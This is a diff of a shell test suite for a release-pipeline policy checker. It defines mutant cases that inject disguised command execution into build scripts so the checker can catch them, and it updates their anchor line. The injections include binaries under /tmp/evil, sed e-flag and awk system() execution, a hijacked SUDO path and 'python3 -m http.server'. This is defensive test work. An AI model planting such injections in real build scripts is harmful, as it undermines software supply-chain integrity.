   bin/build-stage-snapshot-apk.sh 'git tag --force v0.0.0-rc.1 HEAD' 'git tag --force v0.0.0-rc.1 HEAD\ngit foo'
-nsm sh8 "nosource awk system()" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nawk "BEGIN{system(\\"go build\\")}"'
+nsm sh8 "nosource awk system()" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nawk "BEGIN{system(\\"go build\\")}"'
 nsm sh9 "nosource an interpreter variable with -c" "commands, the grammar has" bin/build-apk.sh 'set -euo pipefail' \
   'set -euo pipefail\n"$PY3" -c "import os"'
 nsm sh10 "nosource an interpreter on a script that is not in the closure" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 bin/not-a-script-of-the-closure.py'
-nsm sh11 "nosource a process substitution" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncat <(go build ./...)'
-nsm sh12 "nosource sed with the e flag" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed -n "s/x/go build/e" f'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\npython3 bin/not-a-script-of-the-closure.py'
+nsm sh11 "nosource a process substitution" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncat <(go build ./...)'
+nsm sh12 "nosource sed with the e flag" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed -n "s/x/go build/e" f'
 nsm sh13 "nosource a substitution inside arithmetic" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(( $(go build ./...) ))'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=$(( $(go build ./...) ))'
 nsm sv1 "nosource SUDO assigned twice" "commands, the grammar has" bin/build-apk.sh 'SUDO=/usr/bin/sudo' \
   'SUDO=/usr/bin/sudo\nSUDO=/tmp/x'
 nsm sv2 "nosource GIT assigned twice on one line" ": expected" bin/build-apk.sh 'GIT=/usr/bin/git ' \
@@ -3304,76 +3129,76 @@ nsm sv5 "nosource MELANGE given another location" ": expected" bin/build-apk.sh 
 nsm sv6 "nosource PY3 given another location in assemble-image.sh" ": expected" bin/assemble-image.sh \
   'PY3=/usr/bin/python3' 'PY3=/tmp/python3'
 nsm sd1 "nosource sed with the e command at an address" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nsed '\''1e go build'\'' f'
-nsm sd2 "nosource sed -e with an e command" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed -n -e '\''/x/e'\'' f'
-nsm sd3 "nosource sed with two commands" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed '\''s/a/b/;s/c/d/'\'' f'
-nsm sd4 "nosource sed with the w command" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed '\''w out'\'' f'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nsed '\''1e go build'\'' f'
+nsm sd2 "nosource sed -e with an e command" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed -n -e '\''/x/e'\'' f'
+nsm sd3 "nosource sed with two commands" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed '\''s/a/b/;s/c/d/'\'' f'
+nsm sd4 "nosource sed with the w command" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed '\''w out'\'' f'
 nsm sd5 "nosource sed -ne cluster with an e command" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nsed -ne '\''1e id'\'' f'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nsed -ne '\''1e id'\'' f'
 nsm aw1 "nosource awk with a program from a variable" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nawk "$prog" f'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nawk "$prog" f'
 nsm aw2 "nosource awk with a program from a command substitution" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nawk "$(cat p.awk)" f'
-nsm aw3 "nosource awk with no program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nawk -F: '
-nsm pq1 "nosource a path-qualified cat" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n/tmp/evil/cat x'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nawk "$(cat p.awk)" f'
+nsm aw3 "nosource awk with no program" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nawk -F: '
+nsm pq1 "nosource a path-qualified cat" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n/tmp/evil/cat x'
 nsm pq2 "nosource a path-qualified rm in a directory of the tree" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n./tools/rm x'
-nsm pq3 "nosource a path-qualified bash" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n/tmp/evil/bash bin/chain-verify.py'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n./tools/rm x'
+nsm pq3 "nosource a path-qualified bash" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n/tmp/evil/bash bin/chain-verify.py'
 nsm pq4 "nosource a bin/ script that is not in the closure" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n./bin/not-there.sh'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n./bin/not-there.sh'
 nsm cs1 "nosource make closing a multi-line subshell" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n(\ncd x\nmake)'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n(\ncd x\nmake)'
 nsm cs2 "nosource make closing a multi-line substitution" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n$(\nmake)'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n$(\nmake)'
 nsm rd1 "nosource a quote left open across lines" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\necho '\''a\nmake\nb'\'''
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\necho '\''a\nmake\nb'\'''
 nsm rd2 "nosource a quoted parenthesis inside a substitution" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(echo ")" ; make)'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=$(echo ")" ; make)'
 nsm rd3 "nosource a quoted open parenthesis inside a substitution" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(echo '\''('\'' ; make)'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=$(echo '\''('\'' ; make)'
 nsm rd4 "nosource a substitution inside a single-quoted subscript" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nx=${arr['\''$(make)'\'']}'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=${arr['\''$(make)'\'']}'
 nsm rd5 "nosource a backtick inside a single-quoted subscript" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nx=${arr['\''`make`'\'']}'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=${arr['\''`make`'\'']}'
 nsm fn1 "nosource a function name taken from a comment" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n# make() { :; }\nmake all'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n# make() { :; }\nmake all'
 nsm fn2 "nosource a function name taken from a string" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\necho "x make() y"\nmake all'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\necho "x make() y"\nmake all'
 nsm fw1 "nosource a first command word that is an option" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n-x foo'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n-x foo'
 nsm fw2 "nosource a first command word that is only digits" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n1 foo'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n1 foo'
 nsm ca1 "nosource a command in the second arm of a case line" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\ncase $1 in\n  a) true;; b) make all;;\nesac'
-nsm pq5 "nosource a path-qualified env" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n./tools/env true'
-nsm pq6 "nosource a path-qualified echo" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n./tools/echo hello'
-nsm ip1 "nosource bash -s reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nbash -s bin/chain-verify.py <<< "make"'
-nsm ip2 "nosource python3 - reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\npython3 - bin/chain-verify.py'
-nsm ip3 "nosource python3 -m" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\npython3 -m http.server'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\ncase $1 in\n  a) true;; b) make all;;\nesac'
+nsm pq5 "nosource a path-qualified env" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n./tools/env true'
+nsm pq6 "nosource a path-qualified echo" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n./tools/echo hello'
+nsm ip1 "nosource bash -s reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nbash -s bin/chain-verify.py <<< "make"'
+nsm ip2 "nosource python3 - reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\npython3 - bin/chain-verify.py'
+nsm ip3 "nosource python3 -m" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\npython3 -m http.server'
 nsm ip4 "nosource a combined python option cluster" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\npython3 -Ic pass'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\npython3 -Ic pass'
 nsm sd6 "nosource sed -ee (the attached e is the program)" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nsed -ee sxsxx f'
-nsm sd7 "nosource sed -ne (a combined option)" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed -ne p f'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nsed -ee sxsxx f'
+nsm sd7 "nosource sed -ne (a combined option)" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed -ne p f'
 nsm cf1 "nosource the four-line case shape of the audit seat: an arm and esac on one line, then a subshell" \
-  "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncase x in\nx) true;; esac\n(\nmake)'
-nsm cf2 "nosource a case on one line" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncase $1 in a) true;; esac'
-nsm cf3 "nosource two arms on one line" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncase $1 in\n  a) true;; b) true;;\nesac'
+  "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncase x in\nx) true;; esac\n(\nmake)'
+nsm cf2 "nosource a case on one line" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncase $1 in a) true;; esac'
+nsm cf3 "nosource two arms on one line" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncase $1 in\n  a) true;; b) true;;\nesac'
 nsm sv7 "nosource read -r ignored PY3 (a later operand of read)" "commands, the grammar has" bin/build-apk.sh \
   'PY3=/usr/bin/python3' 'PY3=/usr/bin/python3\nread -r ignored PY3 <<< "x ./tools/python3"'
 nsm sv8 "nosource unset PY3" "commands, the grammar has" bin/build-apk.sh 'PY3=/usr/bin/python3' \
@@ -3400,13 +3225,13 @@ nsl R1 "nosource a ( line then make) inside a case body of a shell helper" "$CNT
   '^set -euo pipefail' 'case $1 in\n  x)\n(\nmake)\n    ;;\nesac'
 nsl R3 "nosource read -r ignored \"PY3\" added to build-apk.sh" "$CNT" bin/build-apk.sh after '^PY3=' \
   'read -r ignored "PY3"'
-nsm F1 "nosource a path word before the command word" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n/tmp/evil/go build'
-nsm F2 "nosource the interpreter with an option" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\npython3 -O bin/chain-verify.py'
-nsm F3 "nosource sed with an e flag" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nsed -n "s/x/y/e" f'
-nsm F4 "nosource esac and ;; sharing a line" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncase $1 in\n  a) true\n  ;; esac'
+nsm F1 "nosource a path word before the command word" "$CNT" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n/tmp/evil/go build'
+nsm F2 "nosource the interpreter with an option" "$CNT" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\npython3 -O bin/chain-verify.py'
+nsm F3 "nosource sed with an e flag" "$CNT" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nsed -n "s/x/y/e" f'
+nsm F4 "nosource esac and ;; sharing a line" "$CNT" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncase $1 in\n  a) true\n  ;; esac'
 nsm F7 "nosource a variable name that is not bare: \${PY3}" "$EXP" bin/apko-lock.sh '"$PY3" -I' '"${PY3}" -I'
 # refused names, one mutant each (an identifier in any position: bare name, attribute, import name, keyword)
 # starts: what may stand in a program start
@@ -3445,19 +3270,19 @@ for h in build-apk.sh assemble-image.sh apko-lock.sh; do
 done
 # a comment naming go build and make changes nothing; a real go version -m line is one more command
 nsfresh
-replace "$work/ns/bin/build-stage-apk.sh" "$work/nsm/bin/build-stage-apk.sh" 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n# never go build here; make is not used' \
+replace "$work/ns/bin/build-stage-apk.sh" "$work/nsm/bin/build-stage-apk.sh" 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n# never go build here; make is not used' \
   && expect ok "cm1 nosource a comment naming go build and make is not code" "" nosource "$work/nsm"
-nsm cm2 "nosource a go version -m line is one more command" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n"$GO_TOOL" version -m out/x'
+nsm cm2 "nosource a go version -m line is one more command" "$CNT" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n"$GO_TOOL" version -m out/x'
 # ---- the real repository --------------------------------------------------------------------------------------------------------------------
 RAL="$root/.github/policy/allowed-actions.json"
-expect ok "AC1/AC2 the real build-freeze, build-apk and build-assemble jobs of release.yml are exactly the Build grammar" "" stage "$root/.github/workflows/release.yml" build "$RAL"
+expect ok "AC1/AC2 the real build-apk and build-assemble jobs of release.yml are exactly the Build grammar" "" stage "$root/.github/workflows/release.yml" build "$RAL"
 expect ok "005-AC1/AC4 the real rebuild-apk and rebuild-assemble jobs of release.yml are exactly the Rebuild grammar" "" stage "$root/.github/workflows/release.yml" \
        rebuild "$RAL"
 for k in $KINDS; do expect ok "AC3/005-AC2 the real bin/build-stage-$k.sh is exactly the grammar" "" script "$root/bin/build-stage-$k.sh" "$k"; done
 shape="$shape_real"
-expect ok "nosource the real tree: no finding (the admission step runs no go; the freeze check is the job freeze)" "" \
+expect ok "nosource the real tree: no finding" "" \
   nosource "$root"
 ns_hits=""
 for n in VARS PYVARS PYCOMPUTED PYEXEC CASEPAT INTERP_OPTS UTIL_OPTS WRAPPER_OPTS; do
@@ -3695,17 +3520,17 @@ for f in files:
             assert not bad, "%s:%d uses the host-tools root as a root or mount (%s)" % (f, i, bad.group(0))
 assert used >= 3, "the scan found no use of the host-tools root"
 PY
-# REQ-CHAIN-004 (the binary says neither (devel) nor vcs.modified=true): the job's own directories (archive/, host-tools/, out/, witness-apk/,
-# admission.json) are untracked in the checkout melange copies, and Go stamps vcs.modified=true for any untracked file. the marked block of bin/build-apk.sh keeps
-# exactly those ten paths out of git's view (Build: archive/ host-tools/ out/ witness-apk/ admission.json freeze/;
+# REQ-CHAIN-004 (the binary says neither (devel) nor vcs.modified=true): the job's own directories (archive/, host-tools/, out/, witness-apk/)
+# are untracked in the checkout melange copies, and Go stamps vcs.modified=true for any untracked file. the marked block of bin/build-apk.sh keeps
+# exactly those eight paths out of git's view (Build: archive/ host-tools/ out/ witness-apk/;
 # Rebuild: build-in/ witness-build/ witness-rapk/ policy.json) (the job-local .git/info/exclude, never committed); the
 # recipe check and build-apk.sh stay strict.
 TREE=$(mktemp -d -p "$work")/tree.sh
 { echo 'GIT=git; set -eu'; echo 'die() { echo "$1" >&2; exit "${2:-1}"; }'; echo 'src=$1'; echo 'PY3=/usr/bin/python3'
   sed -n '/^# tree-exclude begin$/,/^# tree-exclude end$/p' bin/build-apk.sh; } > "$TREE"
 tree_repo() { local d; d=$(mktemp -d -p "$work"); ( cd "$d" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i
-  mkdir archive host-tools out witness-apk freeze && for f in archive host-tools out witness-apk freeze; do echo x > \
-    "$f/f"; done; echo '{}' > admission.json; echo x > freeze/freeze.txt ); echo "$d"; }
+  mkdir archive host-tools out witness-apk && for f in archive host-tools out witness-apk; do echo x > \
+    "$f/f"; done ); echo "$d"; }
 d=$(tree_repo)
 [ -n "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: the job's directories make the tree dirty without the block (the cause of vcs.modified=true)" || bad "REQ-BUILDAPK-001-AC4 tree: the cause did not reproduce"
 trc=127; if [ -f "$TREE" ]; then trc=0; bash "$TREE" "$d" > /dev/null 2>&1 || trc=$?; fi
@@ -3719,7 +3544,7 @@ rm -r "$d/pkg"; echo b >> "$d/tracked"; [ -n "$(git -C "$d" status --porcelain)"
 n=$(mktemp -d -p "$work"); nrc=0; if [ -f "$TREE" ]; then bash "$TREE" "$n" > /dev/null 2>&1 || nrc=$?; fi
 [ "$nrc" = 1 ] && [ -z "$(ls -A "$n")" ] && ok "REQ-BUILDAPK-001-AC4 tree: outside a git checkout the block refuses (exit 1) and writes nothing" || bad "REQ-BUILDAPK-001-AC4 tree: outside a git checkout the block did not refuse with exit 1 and write nothing (exit $nrc)"
 r=$(mktemp -d -p "$work"); ( cd "$r" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i
-  mkdir build-in witness-build witness-rapk && for f in build-in witness-build witness-rapk; do echo x > "$f/f"; done; echo '{}' > policy.json; mkdir archive out witness-apk host-tools; echo x > archive/f; echo x > out/f; echo x > witness-apk/f; echo x > host-tools/f; echo '{}' > admission.json )
+  mkdir build-in witness-build witness-rapk && for f in build-in witness-build witness-rapk; do echo x > "$f/f"; done; echo '{}' > policy.json; mkdir archive out witness-apk host-tools; echo x > archive/f; echo x > out/f; echo x > witness-apk/f; echo x > host-tools/f )
 [ -n "$(git -C "$r" status --porcelain)" ] && bash "$TREE" "$r" > /dev/null 2>&1 && [ -z "$(git -C "$r" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: a Rebuild-shaped checkout (build-in/, witness-build/, witness-rapk/, policy.json beside the Build paths) is clean after the block" || bad "REQ-BUILDAPK-001-AC4 tree: a Rebuild-shaped checkout is still dirty after the block: $(git -C "$r" status --porcelain | tr '\n' ' ')"
 f=$(mktemp -d -p "$work"); ( cd "$f" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i && mkdir archive && echo x > archive/f && printf '# local excludes' > .git/info/exclude )
 bash "$TREE" "$f" > /dev/null 2>&1; [ -z "$(git -C "$f" status --porcelain)" ] && [ "$(head -1 "$f/.git/info/exclude")" = "# local excludes" ] && ok "REQ-BUILDAPK-001-AC4 tree: an exclude file with no final newline keeps its last line and still takes the patterns" || bad "REQ-BUILDAPK-001-AC4 tree: an exclude file with no final newline swallowed a pattern: $(head -3 "$f/.git/info/exclude" | tr '\n' '|')"
@@ -3888,7 +3713,7 @@ if [ "$rc" = 0 ] \
 else bad "AC2 witness-sign-staged.sh: exit $rc, sign calls: $(cat "$wss/log" 2> /dev/null), ${out:0:100}"; fi
 # bin/release-publish.sh stops on the first pushed tag whose registry digest is not the attested one
 rp="$work/rp"; mkdir -p "$rp/bin" "$rp/witness-build" "$rp/fake"
-cp "$root/bin/release-publish.sh" "$root/bin/build-admit.py" "$rp/bin/"; : > "$rp/bin/release-layout.py"; : > "$rp/bin/release-sign-verify.sh"
+cp "$root/bin/release-publish.sh" "$rp/bin/"; : > "$rp/bin/release-layout.py"; : > "$rp/bin/release-sign-verify.sh"
 printf '{"image-production": "%s", "image-fips": "%s"}\n' "$DA" "$DB" > "$rp/witness-build/digests.json"
 for v in production fips; do
   mkdir -p "$rp/images/$v"; : > "$rp/images/$v/oci-layout"; : > "$rp/images/$v/index.json"
